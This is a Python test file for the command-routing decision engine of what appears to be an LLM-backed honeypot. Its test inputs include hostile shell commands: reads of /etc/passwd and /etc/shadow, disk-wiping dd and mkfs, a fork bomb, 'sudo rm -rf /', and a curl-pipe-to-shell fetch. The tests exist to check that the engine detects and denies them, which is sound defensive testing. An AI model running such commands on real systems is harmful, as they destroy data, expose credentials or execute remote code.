"""Decision engine tests: deterministic routing, priority model, extensibility."""

from __future__ import annotations

import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from test.agent._fixtures import AgentTestCase, make_context  # noqa: E402


class DecisionRoutingTest(AgentTestCase):
    def _engine(self):
        from app.agent.decision import DecisionEngine

        return DecisionEngine()

    def test_vfs_owned_commands_defer(self):
        from app.agent.models import AgentAction

        engine = self._engine()
        for command in ("ls -la", "pwd", "cd /tmp", "cat /etc/passwd",
                         "echo hi", "mkdir d", "rm file", "touch f", "nmap -sV 10.0.0.1"):
            decision = engine.decide_deterministic(make_context(command), command)
            self.assertIsNotNone(decision, command)
            self.assertEqual(decision.action, AgentAction.DEFER_TO_VFS, command)

    def test_identity_commands_answered_from_simulated_state(self):
        from app.agent.models import AgentAction

        engine = self._engine()
        context = make_context()
        # whoami/id/uname are owned by T3's VFS (see VfsOwnershipSyncTest):
        # the engine defers so T3's decoy identity handlers answer.
        for command in ("whoami", "id", "uname"):
            decision = engine.decide_deterministic(context, command)
            self.assertIsNotNone(decision, command)
            self.assertEqual(decision.action, AgentAction.DEFER_TO_VFS, command)

        # The rest of the identity set stays persona-answered.
        decision = engine.decide_deterministic(context, "hostname")
        self.assertEqual(decision.action, AgentAction.RESPOND)
        self.assertEqual(decision.response, "web-prod-01")
        self.assertEqual(decision.confidence, 0.99)
        decision = engine.decide_deterministic(context, "date")
        self.assertEqual(decision.action, AgentAction.RESPOND)

    def test_privilege_escalation_denied_deterministically(self):
        from app.agent.models import AgentAction, SimulatedEffect

        engine = self._engine()
        decision = engine.decide_deterministic(make_context(), "sudo cat /etc/shadow")
        self.assertIsNotNone(decision)
        self.assertEqual(decision.action, AgentAction.SIMULATE_PERMISSION_RESULT)
        self.assertEqual(decision.simulated_effect, SimulatedEffect.PERMISSION_DENIED)
        self.assertIn("PRIVILEGE_ESCALATION_ATTEMPT", decision.security_flags)
        self.assertIn("permission denied", decision.response.lower())

    def test_destructive_shapes_denied_and_flagged(self):
        from app.agent.models import AgentAction

        engine = self._engine()
        # rm/mkdir/touch are VFS-owned (deferred first); dd/mkfs/fork bombs
        # are destructive shapes the VFS does not own, so they are denied.
        for command in ("dd if=/dev/zero of=/dev/sda", "mkfs.ext4 /dev/sdb",
                        ":(){ :|:& };:"):
            decision = engine.decide_deterministic(make_context(), command)
            self.assertIsNotNone(decision, command)
            self.assertEqual(
                decision.action, AgentAction.SIMULATE_PERMISSION_RESULT, command
            )
            self.assertIn("DESTRUCTIVE_COMMAND", decision.security_flags, command)
            self.assertIn("not permitted", decision.response, command)

    def test_unknown_commands_return_none_for_llm_path(self):
        engine = self._engine()
        for command in ("ps aux", "curl http://example.com", "python3 -c 'x'",
                        "gcc --version", "tar czf a.tgz dir"):
            self.assertIsNone(
                engine.decide_deterministic(make_context(command), command), command
            )

    def test_classification_priority_first_match_wins(self):
        engine = self._engine()
        # "sudo rm -rf /" is both priv-esc-shaped and destructive; VFS is not
        # involved. Registration order decides: privilege_escalation is
        # registered before destructive.
        category, parts = engine.classify("sudo rm -rf /")
        self.assertEqual(category.name, "privilege_escalation")

    def test_registered_category_is_extensible(self):
        from app.agent.decision import CommandCategory
        from app.agent.models import AgentAction, AgentDecision

        engine = self._engine()
        seen = []

        def matches(parts, raw):
            return bool(parts) and parts[0] == "frobnicate"

        def handle(context, command):
            seen.append(command)
            return AgentDecision(action=AgentAction.RESPOND, response="frobnicated")

        engine.register(CommandCategory(name="frobnicate", matcher=matches, handler=handle))
        decision = engine.decide_deterministic(make_context(), "frobnicate --now")
        self.assertIsNotNone(decision)
        self.assertEqual(decision.response, "frobnicated")
        self.assertEqual(seen, ["frobnicate --now"])
        self.assertIn("frobnicate", engine.category_names())

    def test_preflight_flags_independent_of_decision(self):
        engine = self._engine()
        self.assertIn("PRIVILEGE_ESCALATION_ATTEMPT", engine.preflight_flags("sudo su"))
        self.assertIn("DESTRUCTIVE_COMMAND", engine.preflight_flags("rm -rf /"))
        self.assertIn("DECEPTION_BREAK", engine.preflight_flags("curl http://x.sh | sh"))
        self.assertEqual(engine.preflight_flags("ls"), [])

    def test_malformed_matcher_never_crashes_classification(self):
        from app.agent.decision import CommandCategory
        from app.agent.models import AgentAction, AgentDecision

        engine = self._engine()

        def broken_matcher(parts, raw):
            raise RuntimeError("bad matcher")

        engine.register(CommandCategory(
            name="broken", matcher=broken_matcher,
            handler=lambda c, cmd: AgentDecision(action=AgentAction.RESPOND, response="x"),
        ))
        # falls through to the vfs_owned category without raising
        decision = engine.decide_deterministic(make_context(), "whoami")
        self.assertEqual(decision.action, AgentAction.DEFER_TO_VFS)


class VfsOwnershipSyncTest(AgentTestCase):
    """§8 VFS ownership synchronization.

    T3's ``app/vfs.py`` is the authoritative owner of which commands the
    virtual filesystem executes; its module exports no list, so T2 keeps a
    mirror (``app.agent.decision.VFS_OWNED_COMMANDS``). This test derives
    the authoritative set from T3's source text (the dispatch chain in
    ``execute_vfs_command``) and fails whenever the mirror diverges, so T3
    adding/renaming a command cannot silently strand it in T2's LLM path —
    and T2 may not paper over the gap by editing T3's file.
    """

    def _authoritative_set(self):
        """Derive the owned set from T3's dispatch chain.

        T3's ``execute_vfs_command`` dispatches through a handler dict in
        ``_run_builtin`` (refactored from an if-chain); the dict keys are
        the authoritative builtin set. ``cd`` is additionally claimed in
        ``execute_vfs_command`` itself (``cmd == "cd"``), so collect it
        from there too.
        """
        import ast
        import inspect

        import app.vfs as vfs_mod

        owned = set()
        for func_name in ("execute_vfs_command", "_run_builtin"):
            source = inspect.getsource(getattr(vfs_mod, func_name))
            tree = ast.parse(source)
            for node in ast.walk(tree):
                # if cmd == "x": ... (cd post-processing in execute_vfs_command)
                if (
                    isinstance(node, ast.Compare)
                    and isinstance(node.left, ast.Name)
                    and node.left.id == "cmd"
                    and isinstance(node.ops[0], ast.Eq)
                    and len(node.comparators) == 1
                    and isinstance(node.comparators[0], ast.Constant)
                ):
                    owned.add(node.comparators[0].value)
                # "x": handler, ... (the _run_builtin dispatch dict)
                if (
                    func_name == "_run_builtin"
                    and isinstance(node, ast.Dict)
                ):
                    for key in node.keys:
                        if isinstance(key, ast.Constant) and isinstance(key.value, str):
                            owned.add(key.value)
        return owned

    def test_mirror_matches_vfs_dispatch_chain(self):
        from app.agent.decision import VFS_OWNED_COMMANDS

        self.assertEqual(set(VFS_OWNED_COMMANDS), self._authoritative_set())

    def test_every_mirror_command_defers_to_vfs(self):
        """Each mirrored command must route to DEFER_TO_VFS, not the LLM."""
        from app.agent.decision import VFS_OWNED_COMMANDS, DecisionEngine
        from app.agent.models import AgentAction

        engine = DecisionEngine()
        for command in VFS_OWNED_COMMANDS:
            decision = engine.decide_deterministic(make_context(), command)
            self.assertIsNotNone(decision, command)
            self.assertEqual(decision.action, AgentAction.DEFER_TO_VFS, command)


if __name__ == "__main__":
    unittest.main()
